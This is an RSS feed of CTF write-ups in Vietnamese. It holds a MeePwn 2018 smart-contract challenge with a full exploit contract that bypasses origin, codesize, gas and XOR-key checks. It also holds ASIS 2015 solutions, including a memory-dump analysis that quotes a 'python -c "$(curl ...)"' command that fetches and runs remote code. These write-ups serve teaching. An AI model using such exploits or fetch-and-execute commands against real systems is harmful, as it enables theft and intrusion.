@@ -1,0 +1,285 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	
+xmlns:georss="http://www.georss.org/georss" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
+>
+
+<channel>
+	<title>misc &#8211; BabyPhD CTF Team</title>
+	<atom:link href="https://babyphd.net/category/misc/feed/" rel="self" type="application/rss+xml" />
+	<link>https://babyphd.net</link>
+	<description>Nói chung đây là một khái niệm vô cùng trừu tượng</description>
+	<lastBuildDate>Thu, 16 Aug 2018 21:09:22 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.2.2</generator>
+<site xmlns="com-wordpress:feed-additions:1">104079289</site>	<item>
+		<title>MEEPWN CTF 2018 - meepwn contract</title>
+		<link>https://babyphd.net/2018/08/01/meepwn-ctf-2018-meepwn-contract/</link>
+				<pubDate>Wed, 01 Aug 2018 12:47:31 +0000</pubDate>
+		<dc:creator><![CDATA[vigov5]]></dc:creator>
+				<category><![CDATA[misc]]></category>
+		<category><![CDATA[smartcontract]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=771</guid>
+				<description><![CDATA[https://scoreboard.meepwn.team/task Source code của "gate": pragma solidity ^0.4.18; contract Meepwn_Wire { address public entrant; constructor() { entrant = msg.sender; } function isAccountAddress(address addr) private returns(bool) { uint x; assembly { x := extcodesize(caller) } return x == 0; } function exploitMe(bytes8 _key) { require(msg.sender != tx.origin); require(isAccountAddress(msg.sender)); require(msg.gas % 1337 == 0); require(uint64(_key) ^ uint64(sha3(msg.sender)) &#8230; <a href="https://babyphd.net/2018/08/01/meepwn-ctf-2018-meepwn-contract/" class="more-link">Continue reading <span class="screen-reader-text">MEEPWN CTF 2018 - meepwn contract</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p><a href="https://scoreboard.meepwn.team/task" target="_blank" rel="noopener">https://scoreboard.meepwn.team/task</a></p>
+<p><img class="medium-zoom-image" src="https://i0.wp.com/images.viblo.asia/fd265c3f-adf9-428b-8bee-30682193eff2.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/fd265c3f-adf9-428b-8bee-30682193eff2.png" data-recalc-dims="1" /></p>
+<p>Source code của "gate":</p>
+<pre class="language-js"><code class="language-js">pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>
+
+contract Meepwn_Wire
+<span class="token punctuation">{</span>
+    address <span class="token keyword">public</span> entrant<span class="token punctuation">;</span>
+    
+    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        entrant <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    
+    <span class="token keyword">function</span> <span class="token function">isAccountAddress</span><span class="token punctuation">(</span>address addr<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token function">returns</span><span class="token punctuation">(</span>bool<span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        uint x<span class="token punctuation">;</span>
+        assembly <span class="token punctuation">{</span> x <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span>caller<span class="token punctuation">)</span> <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    
+    <span class="token keyword">function</span> <span class="token function">exploitMe</span><span class="token punctuation">(</span>bytes8 _key<span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">require</span><span class="token punctuation">(</span><span class="token function">isAccountAddress</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>gas <span class="token operator">%</span> <span class="token number">1337</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">require</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span>_key<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        
+        entrant <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><span id="more-771"></span></p>
+<p>Interface của contract chính:</p>
+<pre class="language-js"><code class="language-js">pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>
+
+contract MeePwnMain <span class="token punctuation">{</span>
+
+  <span class="token keyword">function</span> <span class="token function">getNewInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> payable <span class="token function">returns</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+  <span class="token keyword">function</span> <span class="token function">submitInstance</span><span class="token punctuation">(</span>string email<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">returns</span><span class="token punctuation">(</span>bytes32<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>sau khi truy cập đến <a href="http://178.128.87.12/smart-contract" target="_blank" rel="noopener">http://178.128.87.12/smart-contract</a> những việc bạn cần làm như sau (hiện site đã không truy cập được nữa, mình xin phép tóm tắt lại theo...kí ức của mình <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f604.png" alt="😄" class="wp-smiley" style="height: 1em; max-height: 1em;" />)</p>
+<ul>
+<li>Sẽ có một contract chính tại địa chỉ <a href="https://ropsten.etherscan.io/address/0x3da169ad88c8f419b57e181fe971b33993dfdc81" target="_blank" rel="noopener">0x3da169ad88c8f419b57e181fe971b33993dfdc81</a> được deploy trên Testnet Ropsten</li>
+<li>Bạn sẽ gọi hàm <code>getNewInstance</code> chuyển 0.1 ETH vào địa chỉ này, contract chính sẽ deploy contract <strong>Meepwn_Wire</strong> ở trên và gán <code>entrant = msg.sender</code> tức là địa chỉ của contract chính.</li>
+<li>Nhiệm vụ của bạn làm thế nào đó, dùng hàm <code>exploitMe</code>, vượt qua tất cả các "gate", set lại biến <code>entrant</code> thành địa chỉ của mình (pwned !)</li>
+<li>Sau đó gọi hàm <code>submitInstance</code> kèm với email của mình để chứng minh mình đã làm được, để hệ thống gửi flag về email mà bạn submit.</li>
+</ul>
+<p>Về cơ bản, mô hình này khá giống với <a href="https://ethernaut.zeppelin.solutions/" target="_blank" rel="noopener">Ethernaut</a> cụ thể hơn thì bạn có thể tham khảo thêm các bài write-up của anh <a href="https://viblo.asia/u/kiendinang" target="_blank" rel="noopener">@kiendinang</a> trên Viblo, với nhiều cấp độ từ dễ đến khó.</p>
+<h1 id="_walk-through-1">Walk Through</h1>
+<p>Mình xin tóm tắt các bước để vượt qua các gate như sau:</p>
+<h2 id="_gate-1-2">Gate 1</h2>
+<p><code>require(msg.sender != tx.origin);</code> : Trong Solidity thì <code>msg.sender</code> là thứ/người trực tiếp gọi hàm của contract, còn <code>tx.origin</code> là người tạo ra transaction. Do vậy <code>tx.origin</code> sẽ luôn là người dùng, còn <code>msg.sender</code> thì có thể là người dùng hoặc là một contract khác. Do vậy ta có mô hình sau:</p>
+<pre class="language-none"><code class="language-none">A (người dùng) -&gt; B (exploit contract) -&gt; C (Meepwn_Wire contract)
+</code></pre>
+<p>Với mô hình này sẽ đảm bảo được <code>msg.sender != tx.origin</code></p>
+<h2 id="_gate-2-3">Gate 2</h2>
+<p><code>require(isAccountAddress(msg.sender));</code> : Gate này đúng như tên hàm, kiểm tra xem địa chỉ đang tương tác với contract, có phải là người dùng không hay là một contract khác ? và <strong>Meepwn_Wire</strong> yêu cầu <code>msg.sender</code> phải là một account người dùng thông qua việc kiểm tra storage của account có chứa code hay không bằng đoạn assembly (nếu địa chỉ là người dùng thì sẽ codesize == 0, và ngược lại nếu đó là một contract khác)</p>
+<pre class="language-js"><code class="language-js">assembly <span class="token punctuation">{</span> x <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span>caller<span class="token punctuation">)</span> <span class="token punctuation">}</span>
+</code></pre>
+<p>Nếu vậy, trick chúng ta dùng ở bước 1 sẽ fail ? Tuy nhiên, có một thời điểm mà codesize của một contract bằng 0, đó chính là thời điểm mà contract được deploy (nói cách khác, khi đang chạy contructor của contract), như được note trong <a href="https://github.com/ethereum/yellowpaper" target="_blank" rel="noopener">yellow paper</a> của Ethereum. Vậy để pass qua gate này, ta cần thực hiện exploit trong contructor của contract. Đến đây ta có thể xây dựng được contract tạm thời dùng để exploit như sau:</p>
+<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
+    
+    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
+    
+    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        t<span class="token punctuation">.</span><span class="token function">exploitMe</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>với target là địa chỉ của contract <code>Meepwn_Wire</code> mà contract chính đã deploy. Để biết được địa chỉ này, bạn có thể tìm đến transaction <code>getNewInstance</code> trên <a href="https://ropsten.etherscan.io/" target="_blank" rel="noopener">https://ropsten.etherscan.io/</a> và kiểm tra tab <code>Internal Transactions</code>.</p>
+<h2 id="_gate-3-4">Gate 3</h2>
+<p><code>require(msg.gas % 1337 == 0);</code> : Gate này yêu cầu số gas còn lại (<code>msg.gas</code>) tại thời điểm thực hiện kiểm tra phải chia hết cho 1337. Để thực hiện điều này, ta có thể gọi hàm <code>exploitMe</code> theo cách sau:</p>
+<pre class="language-js"><code class="language-js">t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span>xxx<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">)</span>
+</code></pre>
+<p>với <code>xxx</code> là số gas dùng để chạy hàm <code>exploitMe</code>. Như vậy chúng ta sẽ control được số gas truyền vào. Vậy truyền vào bao nhiêu gas để thoả mãn ? Mình sẽ làm theo cách thử saim truyền vào 1 số gas tuỳ ý, và kiểm tra instruction trên Remix.</p>
+<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
+    
+    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
+    
+    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">98000</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x41414141</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Ví dụ chạy với gas 98000, chắc chắn transaction sẽ fail, bằng sử dụng môi trường Javascript VM trên Remix sẽ cho phép chúng ta debug:<img class="medium-zoom-image" src="https://i2.wp.com/images.viblo.asia/a22a0df6-77f0-4920-b715-634fa749ffda.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/a22a0df6-77f0-4920-b715-634fa749ffda.png" data-recalc-dims="1" /></p>
+<p>Click <code>Debug</code>, mở phần <code>Instructions</code> và <code>Stack</code> và step qua từng instruction cho đến đoạn kiểm tra số gas:</p>
+<p><img class="medium-zoom-image" src="https://i1.wp.com/images.viblo.asia/bd209629-0feb-4b81-934e-bb8d9d5f8705.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/bd209629-0feb-4b81-934e-bb8d9d5f8705.png" data-recalc-dims="1" /></p>
+<p>IP hiện đang ở 363, ngay sau khi chúng ta chạy xong <code>GAS</code>, top stack lúc này sẽ chính là số gas còn lại: <code>0x17abc = 96956</code> (tại ngăn tiếp theo chính là giá trị <code>0x539</code> = 1337). Vậy ta sẽ có gas thoả mãn là:</p>
+<pre class="language-none"><code class="language-none">98000 - 96956 % 1337 = 97308
+</code></pre>
+<p><strong>Note</strong>: Để đảm bảo debug đúng thì version compiler và thiết lập optimize của bạn và đề bài phải giống nhau, rất may, đều đang là version <code>soljson-v0.4.24+commit.e67f0147.js</code> <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f604.png" alt="😄" class="wp-smiley" style="height: 1em; max-height: 1em;" />, cơ mà nếu có sai thì cũng sai khác nhau không quá 100 gas, chúng ta có thể brute-force được <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f606.png" alt="😆" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<h2 id="_gate-4-5">Gate 4</h2>
+<p><code>require(uint64(_key) ^ uint64(sha3(msg.sender)) ^ uint64(sha3(address(this))) == 0x13371337);</code> : gate này là khá đơn giản (tuy nhiên trong thời gian thi BTC đã không may đeploy nhầm source code đoạn này khiến các đội thi tốn cỡ "1 tiếng" tìm cách brute-force 8 bytes sha3 (nếu thực sự có team định làm vậy <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f605.png" alt="😅" class="wp-smiley" style="height: 1em; max-height: 1em;" />)), đây là phép XOR và chúng ta làm lại như sau:</p>
+<pre class="language-js"><code class="language-js">_key <span class="token operator">=</span> <span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span>
+
+</code></pre>
+<p><code>this</code> ở đây sẽ cho ra địa chỉ contract exploit của chúng ta.</p>
+<h2 id="_full-exploit-6">Full Exploit</h2>
+<p>(Test thử trên Remix trước cho chắc ăn rồi hãy submit nhé)</p>
+<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
+    
+    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
+    
+    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">97308</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Việc còn lại là thực hiện <code>submitInstance</code> và chờ mail flag về:</p>
+<p><img class="medium-zoom-image" src="https://i0.wp.com/images.viblo.asia/24d169be-0e35-4eb1-8c0c-c715b9ed1b46.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/24d169be-0e35-4eb1-8c0c-c715b9ed1b46.png" data-recalc-dims="1" /></p>
+<h1 id="_references-7">References</h1>
+<ul>
+<li><a href="https://viblo.asia/s/blockchain-smart-contract-Am5yq0mq5db" target="_blank" rel="noopener">https://viblo.asia/s/blockchain-smart-contract-Am5yq0mq5db</a></li>
+<li><a href="http://solidity.readthedocs.io/en/v0.4.24/" target="_blank" rel="noopener">http://solidity.readthedocs.io/en/v0.4.24/</a></li>
+</ul>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">771</post-id>	</item>
+		<item>
+		<title>ASIS Quals CTF 2015 - grids, keka-bomb, dump Writeup</title>
+		<link>https://babyphd.net/2015/05/12/asis-quals-ctf-2015-grids-writeup/</link>
+				<pubDate>Tue, 12 May 2015 09:57:45 +0000</pubDate>
+		<dc:creator><![CDATA[gaylord]]></dc:creator>
+				<category><![CDATA[forensic]]></category>
+		<category><![CDATA[misc]]></category>
+		<category><![CDATA[vietnamese]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=334</guid>
+				<description><![CDATA[Programming 300 - grids Đề bài nhận được là cho 1 tập hợp điểm trên mặt phẳng 2D, cần tìm diện tích đa giác lớn nhất tạo được mà các đỉnh của đa giác được lấy từ tập hợp điểm đã cho. Dễ thấy là đa giác cần tìm cần bao trọn toàn bộ tập &#8230; <a href="https://babyphd.net/2015/05/12/asis-quals-ctf-2015-grids-writeup/" class="more-link">Continue reading <span class="screen-reader-text">ASIS Quals CTF 2015 - grids, keka-bomb, dump Writeup</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p><strong>Programming 300 - grids</strong></p>
+<p>Đề bài nhận được là cho 1 tập hợp điểm trên mặt phẳng 2D, cần tìm diện tích đa giác lớn nhất tạo được mà các đỉnh của đa giác được lấy từ tập hợp điểm đã cho. Dễ thấy là đa giác cần tìm cần bao trọn toàn bộ tập điểm, nên bài toán quy về việc tính diện tích <a href="http://en.wikipedia.org/wiki/Convex_hull">bao lồi</a> của tập điểm này.</p>
+<p>Có thể dùng <a href="http://en.wikipedia.org/wiki/Graham_scan">thuật toán quét Graham</a> để tìm bao lồi sau đó dùng <a href="http://en.wikipedia.org/wiki/Shoelace_formula">công thức tính diện tích của Gauss</a> để tính diện tích đa giác vừa tìm được. Nhưng trong SciPy đã có <a href="http://docs.scipy.org/doc/scipy-dev/reference/generated/scipy.spatial.ConvexHull.html">code tìm bao lồi</a> nên mình không cần phải code lại phần bao lồi nữa :))</p>
+<p>Code của mình (mình k biết chèn gist vào đây như thế nào :&lt;):</p>
+<pre class="font:consolas lang:python decode:true" title="asisctf_grids">from scipy.spatial import ConvexHull
+import numpy as np
+import ast
+import telnetlib
+import re
+ 
+class Telnet(telnetlib.Telnet):
+    # inherit from Telnetlib and add new method
+    def __init__(self,host,port):
+        telnetlib.Telnet.__init__(self,host,port)
+    # make easier when you want to send raw data to server
+    def writeRawData(self,data):
+        return self.get_socket().send(data)
+ 
+    def recvRawData(self,size):
+        return self.get_socket().recv(size)
+ 
+# Calculate algebraic area of a polygon using shoelace formula
+def area(vertices):
+    n = len(vertices)
+    area = 0.0
+    for i in range(n):
+        j = (i + 1) % n
+        area += vertices[i][0] * vertices[j][1]
+        area -= vertices[j][0] * vertices[i][1]
+    area /= 2.0
+    return area
+ 
+host = '217.218.48.84'
+port = 12432
+ 
+# connect
+tel = Telnet(host, port)
+s = tel.read_until('Are you ready for this challenge?\n')
+print s,
+# reply
+print 'yes'
+tel.writeRawData('yes\n')
+s = tel.read_until('OK, OK, lets start\n')
+print s,
+# solve
+for i in range(99):
+    print '[*] %d-th round' % i
+    s = tel.read_until("What's the area?")
+    print s,
+    l = np.array(ast.literal_eval(re.findall(r'\n(<p style='text-align:center;'><span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_4fd4a56c435d5c26b3c3c366f51b074e.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none;' class='tex' alt="" data-recalc-dims="1" /></span></p>)\n', s)[0]))
+    hull = ConvexHull(l)
+    vertices = l[hull.vertices]
+    res = abs(area(vertices))
+    print res
+    tel.writeRawData(str(res)+'\n')
+# get flag
+tel.interact()</pre>
+<p>Flag là</p>
+<pre>ASIS{f3a8369f4194c5e44c03e5fcefb8ddf6}</pre>
+<p><strong>Forensics 75 - Keka Bomb</strong></p>
+<p>File đã cho là một file 7z và bên trong nó gồm nhiều file 7z con với dung lượng mỗi file khoảng 4GB : 0009.7z -&gt; 0000007.7z -&gt; 0000000008.7z -&gt; bomb_8, mở file này bằng HxD, tìm chuỗi "ASIS" sẽ thấy flag:</p>
+<pre>ASIS{f974da3203d155826974f4a66735a20b}</pre>
+<p><strong> Forensics 250 - Dump</strong><br />
+File trong đề là 1 file .sav của VirtualBox nhận được khi tạo snapshot hoặc suspend máy ảo. File chỉ chứa một phần RAM đã được sử dụng và được sắp xếp theo một trật tự không nhất định nên (theo quá trình Google của mình) không thể lấy trực tiếp thông tin trên đây được :&lt;, mà cần phải chạy file .sav trên VirtualBox rồi tạo core dump hoặc memdump sau đấy mới phân tích được.</p>
+<p>Mình đã tạo một máy ảo VirtualBox với hệ điều hành là Ubuntu x64, để ổ cứng kết nối ở IDE Primary Master, card mạng là Am79C973, RAM là 128MB. Sau đó mình boot máy ảo này, suspend nó, rồi ghi đè file đã cho vào file .sav được VirtualBox tạo ra. Sau đó khi khởi động lại, mình vào được trạng thái đang lưu trong file .sav với hệ điều hành là Tiny Core Linux:</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?ssl=1"><img data-attachment-id="345" data-permalink="https://babyphd.net/2015/05/12/asis-quals-ctf-2015-grids-writeup/asis_dump/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?fit=1024%2C768&amp;ssl=1" data-orig-size="1024,768" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="asis_dump" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?fit=604%2C453&amp;ssl=1" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?resize=300%2C225&#038;ssl=1" alt="asis_dump" width="300" height="225" class="alignnone size-medium wp-image-345" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?w=1024&amp;ssl=1 1024w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
+<p>Ở trong lịch sử dòng lệnh, có một lệnh là </p>
+<pre>python -c "$(curl -fSsL http://a.asis.io/0QnqZU9F)"</pre>
+<p>Lệnh này down 1 file .py từ server và thực hiện file này. Mình đã không quan tâm đến nó trong khi đây chính là mấu chốt của bài toán :&lt; (cảm ơn anh @yeuchimse đã chỉ cho em đoạn này :3).</p>
+<p>Như vậy có khả năng file Python kia vẫn còn được lưu đâu đó ở trong RAM của máy ảo, vì vậy cần phải đọc được RAM và tìm kiếm đoạn &#039;Please enter the access key&#039; vì khi chương trình được chạy có in ra dòng này. Trong quá trình thi, mình đã chạy VirtualBox trong một máy ảo VMware và dump RAM của máy ảo VMware để tìm trong đó :&lt;. Tuy vậy có một cách đơn giản hơn là dùng HxD hoặc Cheat Engine. Sau khi tìm kiếm với chuỗi: </p>
+<pre>'Please enter the access key</pre>
+<p>, ta tìm được đoạn code:</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?ssl=1"><img data-attachment-id="346" data-permalink="https://babyphd.net/2015/05/12/asis-quals-ctf-2015-grids-writeup/memview/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?fit=732%2C626&amp;ssl=1" data-orig-size="732,626" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="memview" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?fit=300%2C257&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?fit=604%2C517&amp;ssl=1" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?resize=300%2C257&#038;ssl=1" alt="memview" width="300" height="257" class="alignnone size-medium wp-image-346" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?resize=300%2C257&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?w=732&amp;ssl=1 732w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
+<p>Đoạn code này yêu cầu nhập 1 chuỗi là key, và nếu key đúng sẽ in ra thứ gì đó. Thử xây dựng lại key từ file code tìm được, sau đó dùng key này để tìm chuỗi in ra:</p>
+<pre class="font:consolas lang:python decode:true">import hashlib
+ 
+# calculate key
+key_ar = [0 for i in range(5)]
+key_ar[0] = hex(58559604012647)[2:].decode('hex')
+key_ar[1] = hex(27697077611219024)[2:].decode('hex')
+key_ar[2] = hex(28839576914310229)[2:].decode('hex')
+key_ar[3] = hex(14469853439423811)[2:].decode('hex')
+key_ar[4] = hex(21189029315236706)[2:].decode('hex')
+key = '-'.join(key_ar)
+ 
+# original code
+# key = raw_input('Please enter the access key: ').strip()
+if len(key) == 38:
+    key_ar = key.split('-')
+    if len(key_ar) == 5:
+        if int(key_ar[0].encode('hex'), 16) ==  58559604012647:
+            if int(key_ar[1].encode('hex'), 16) == 27697077611219024:
+                if int(key_ar[2].encode('hex'), 16) == 28839576914310229:
+                    if int(key_ar[3].encode('hex'), 16) == 14469853439423811:
+                        if int(key_ar[4].encode('hex'), 16) == 21189029315236706:
+                            print key[18] + key[-2] + chr(ord(key[26]) - 1) + key[-2] + '{' + hashlib.md5(key).hexdigest() + '}'
+                        else:
+                             print 'You access key is not correct! Banned!!'
+                    else:
+                        print 'You access key is not correct! Banned!!'
+                else:
+                    print 'You access key is not correct! Banned!!'
+            else:
+                print 'You access key is not correct! Banned!!'
+        else:
+            print 'You access key is not correct! Banned!!'
+    else:
+        print 'You access key is not correct! Banned!!'
+else:
+    print 'You access key is not correct! Banned!!'</pre>
+<p>Sau khi chạy file trên, ta được flag: </p>
+<pre>ASIS{632253c69a6049594bc303f0af0042b8}</pre>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">334</post-id>	</item>
+	</channel>
+</rss>
